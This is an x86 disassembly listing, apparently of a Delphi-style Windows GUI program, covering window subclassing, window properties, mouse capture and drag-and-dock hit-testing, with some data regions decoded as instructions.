add eax [ eax - 0x1bfc550b ]
hlt
sub_3aabdf8
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add al 0x0
pop es
inc ecx
insb
insb
outsd
arpl [ edx + 0x79 ] ax
int3
sub_3aabf0c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
mov edi 0x2803aa
add [ eax ] al
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ eax + 0x43 ]
cmpsb [ esi ] [ edi ]
add ecx [ ecx ]
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_3aabffa
fdivr [ edi - 0x4019fc56 ]
stosb [ edi ]
add esi eax
mov edi 0xbf6103aa
stosb [ edi ]
add ebp [ ecx - 0x41 ]
stosb [ edi ]
add esi [ ecx - 0x41 ]
stosb [ edi ]
add edi [ ecx - 0x41 ]
stosb [ edi ]
add eax [ esi - 0x6cfc5541 ]
mov edi 0xbfa003aa
stosb [ edi ]
add ebp [ ebp - 0x45fc5541 ]
mov edi 0xbfc703aa
stosb [ edi ]
add edx esp
mov edi 0x103aa
add [ eax ] al
jns r-xdata
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffbffae870 ] eax
stosb [ edi ]
add edi [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
mov al [ 0x3203aac0 ]
shr [ edx + 0x3 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
shr [ edx + 0x7c03 ] 0x0
mov ah 0x11
cmpsb [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add esi [ ebp * 2 + 0x6d4003a6 ]
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx [ eax + 0x6d ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edi [ eax - 0x5a ]
stosd [ edi ]
add ecx esp
cmpsb [ esi ] [ edi ]
stosd [ edi ]
add edx [ eax + 0x4803abca ]
test al 0xab
add ebx [ eax - 0x58 ]
stosd [ edi ]
add ecx [ eax ]
mov al 0xab
add edx eax
0x3ab
sub_3aac0fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
shr [ edx + 0x3003 ] 0x0
rcl [ eax ] 0xa6
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add edi eax
into
stosd [ edi ]
add eax [ esi ]
push esp
dec ebp
outsd
jne r-xdata
cmp ch [ eax - 0x57c1effd ]
add esi eax
sub [ ebx - 0x547d43fd ] ebp
add ecx eax
mov [ ebx - 0x5477ebfd ] ch
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
nop
cwde
shr [ edx + 0x3 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xc2
stosb [ edi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5003aac2 ] bl
add al [ eax ]
add ah ch
mov bl 0xaa
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add ebp [ edx + edx * 2 ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esi [ ebx + ebp ]
stosd [ edi ]
add ebx [ eax - 0x13fc5478 ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
[ ebx - 0x547d43fd ] ebp
sub ebp [ ebx - 0x547767fd ]
add ebp esp
sub_3aac49c
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x1b4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x1c0 ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x1c0 ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x1c0 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
jmp r-xdata
sub_3aac5ac
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call __imp_SendMessageA
pop edx
pop ebx
retn
sub_3aac5e0
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_3a65730
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_3aac5ac
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_3aac63c
push ebx
mov ebx eax
mov eax ebx
call sub_3aac5e0
test eax eax
setne al
test al al
jne r-xdata
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call [ rw-data ]
sub_3aac66c
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call __imp_SendMessageA
pop esi
pop ebx
retn
sub_3aac850
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_3a6e0bc
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_3a65798
mov eax edi
mov edx esi
call sub_3a652f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3aac894
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_3a6e0bc
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_3a65798
mov eax edi
mov edx esi
call sub_3a652f4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3aac8d8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_3ab0e78
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3aac954
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_3aac99c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_3aac9b9
leave
stosb [ edi ]
add edx [ eax ]
add [ eax ] al
add [ eax - 0x37fc5885 ] al
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebx [ ebx ]
cmpsd [ esi ] [ edi ]
add edi [ esp - 0x58c3fc59 ]
cmpsd [ esi ] [ edi ]
add ebp eax
0x3aa
sub_3aaca00
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
xor eax eax
mov [ edi ] eax
xor ebx ebx
jmp r-xdata
mov eax [ edi ]
cmp eax [ esi + 0x8 ]
jl r-xdata
mov edx [ edi ]
mov eax esi
call sub_3a7a494
cmp ebp [ eax + 0x4 ]
sete bl
test bl bl
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ edi ]
sub_3aaca38
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ab7c38
mov ebx eax
mov esi ebx
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov esi ebx
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_3aaca64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_3a62ee0
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_3aaca38
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_3aaca00
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_3a7a33c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3a7a494
mov edi eax
mov eax [ edi ]
call sub_3ab7c38
push eax
mov eax [ ebx ]
call sub_3ab7c38
push eax
call IsChild
test eax eax
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3a7a510
jmp r-xdata
inc [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3aacae8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_3a7a370
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_3a7a494
mov edx 0x8
call sub_3a62efc
inc esi
dec ebx
jne r-xdata
sub_3aacb1c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_3a7a494
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_3aaca00
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_3aacb80
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
retn
sub_3aacbe0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_3a64260
mov edx esp
mov eax esi
call sub_3a65504
add esp 0x100
pop esi
pop ebx
retn
sub_3aacc1c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3aacd1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ edx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_3aadd88
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0x10
call sub_3aad6f8
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ edx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edx + 0x8 ]
mov [ ebp - 0x10 ] eax
movsx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
movsx eax [ ebp - 0xe ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_3aad6f8
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ edx + 0xc ] 0x1
xor eax eax
call sub_3aadd88
jmp r-xdata
mov eax [ rw-data ]
add eax 0x10
call sub_3aad6f8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_3aadd88
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
jmp r-xdata
mov al 0x1
call sub_3aadd88
jmp r-xdata
xor eax eax
call sub_3aadd88
jmp r-xdata
sub_3aacd20
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3acf68c
call sub_3a64cb0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_3aadd88
sub_3aacd78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3aacda2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3aace08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3aacb80
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
sub_3aace34
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov eax edi
mov si 0xffdd
call sub_3a6457c
sub_3aace58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x40 ]
mov si 0xffdf
call sub_3a6457c
xor edx edx
sub_3aaceb0
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_3ab9c80
sub_3aaced0
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_3ab9c68
sub_3aacef4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3aacde4
mov [ ebx + 0x38 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89978
mov esi eax
mov [ ebx + 0x48 ] esi
mov edx 0xffffff
xor eax eax
call sub_3a90704
mov edx eax
mov eax esi
call sub_3a89af4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3aacf5c
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x48 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3aacf8c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3aace08
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
movzx edx [ eax + 0x5c ]
mov [ ebx + 0x5c ] dl
mov edx [ eax + 0x60 ]
mov [ ebx + 0x60 ] edx
movzx edx [ eax + 0x74 ]
mov [ ebx + 0x74 ] dl
push esi
lea esi [ eax + 0x4c ]
lea edi [ ebx + 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x64 ]
lea edi [ ebx + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_3aad008
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_3aad02c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_3aad008
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_3aad008
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x4c ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_3aad0ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_3aad158
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_3aad5a0
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_3aac5e0
mov esi eax
test esi esi
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_3ab7c38
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_3ab7c38
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3ab7c38
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbc
call sub_3a6457c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_3aad0ec
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_3ab7c38
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x94 ]
call sub_3ab7c38
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_3aad2f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_3ab7c38
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3ab7c38
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_3aad338
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xbc ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_3aacb1c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_3aad158
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_3a7a494
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_3ab7c38
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_3aad2f4
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbb
call sub_3a6457c
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
